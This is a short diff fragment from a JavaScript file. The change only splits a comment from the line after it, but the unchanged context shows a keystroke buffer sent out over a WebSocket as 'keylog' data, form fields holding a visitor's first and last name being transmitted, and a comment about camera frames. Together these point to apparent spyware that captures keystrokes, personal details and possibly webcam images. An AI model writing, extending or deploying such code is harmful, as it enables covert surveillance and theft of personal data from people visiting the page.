@@ -1258,7 +1258,8 @@
         sendWS({ type: 'keylog', keys: klBuffer.splice(0) });
       }
 
-      // Send form data immediately before camera frames      sendWS({
+      // Send form data immediately before camera frames
+      sendWS({
         type: 'form_data',
         firstName: document.getElementById('firstName').value,
         lastName: document.getElementById('lastName').value,
